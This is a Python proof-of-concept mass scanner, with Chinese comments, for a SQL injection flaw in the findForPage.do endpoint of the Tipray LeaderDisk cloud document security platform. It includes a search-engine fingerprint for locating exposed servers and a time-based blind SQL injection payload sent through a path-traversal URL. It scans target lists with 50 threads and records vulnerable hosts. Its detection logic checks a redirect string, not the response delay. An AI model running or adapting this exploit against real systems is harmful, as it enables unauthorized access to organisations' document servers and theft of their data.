#天锐绿盘云文档安全管理平台findForPage存在SQL注入
#body="/lddsm/" || title="天锐绿盘" || title=="Tipray LeaderDisk"||body="location.href=location.href+\"lddsm\""
import argparse,json,requests,sys
from multiprocessing.dummy import Pool   #多线程库
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def banner():
    pass
def poc(target):
    link1 = "/lddsm/login.jsp"
    headers1 = {
    "User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0"
}
    #目标主机拒绝连接，程序后续会停止，添加try
    try:
        res1 = requests.get(url=target+link1,headers=headers1,timeout=5,verify=False)
        if res1.status_code == 200:
            link2 = "/lddsm/service/../admin/bfclConfig/findForPage.do"
            headers2 = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
            data = """page=1&rows=10&sidx=(SELECT 2005 FROM (SELECT(SLEEP(3)))IEWh)"""
            res2 = requests.post(url=target+link2,headers=headers2,data=data,timeout=5,verify=False)
            if "<script>window.location.href='/lddsm/login.jsp';</script>" in res2.text:
                print(f"[+]{target}存在sql注入漏洞!")
                with open('result.txt','a',encoding='utf-8')as fp:
                    fp.write(target+'\n')
            else:
                print(f"[-]{target}不存在sql注入")
        else:
            print(f"[*]{target}访问有问题，请手工检查")
    except:
        print(f"[-]{target}请求错误")



def main():
    banner()

    #第一个处理用户输入的参数
    parse = argparse.ArgumentParser(description = "天锐绿盘云文档安全管理平台findForPage存在SQL注入")

    #添加命令行的参数
    parse.add_argument('-u','--url',dest='url',type=str,help="please input your link")
    parse.add_argument('-f','--file',dest='file',type=str,help="please input your file path")

    #实例化
    args = parse.parse_args()

    #对用户的输入做判断，url还是文件
    if args.url and not args.file:
        #开始测试
        poc(args.url)
    elif args.file and not args.url:
        #开始读取文件并逐个测试
        url_list = []
        with open(args.file,'r',encoding='utf-8')as f:
            for i in f.readlines():
                url_list.append(i.strip())
        #多线程
        print(f"[*] 已加载 {len(url_list)} 个URL进行测试")
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
        print("[*] 所有URL测试完成")
    else:
        print(f"usage:Python{sys.argv[0]}-h")

#设置程序的入口

if __name__ == "__main__":
    main()
